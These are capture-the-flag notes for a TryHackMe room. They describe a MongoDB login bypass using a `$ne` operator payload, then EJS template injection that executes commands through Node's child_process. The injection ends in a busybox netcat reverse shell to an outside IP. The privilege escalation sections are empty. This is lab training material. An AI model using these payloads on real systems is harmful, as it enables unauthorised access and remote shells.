# URL
https://tryhackme.com/room/hh-donotdisturb-84a45644
# Concept
* NoSQL Login Bypass
* EJS Template Injection
# Method of solve
## Beginning Scans
* there's port `22` and `80`
* on the landing page, there's a login
* we suspect that the target user is named `attendant`
* there's a NoSQL system in place, MongoDB
  * the framework being used is NodeJS, and MongoDB is often paired with NodeJS
* the payload that gets us in is `username=attendant&password[$ne]=1`
* we can copy the cookie and paste it into our web browser to get acccess
## Initial Access
* the `/staff` endpoint lets us write an EJS script, and we can use EJS for template injection:
```
global.process.mainModule.require('child_process').execSync('which busybox')
```
* this payload will get us in
```
global.process.mainModule.require('child_process').execSync('busybox nc 192.168.134.186 443 -e /bin/bash')
```

## Privilege Escalation
## EJS Template Injection Payload
```

```
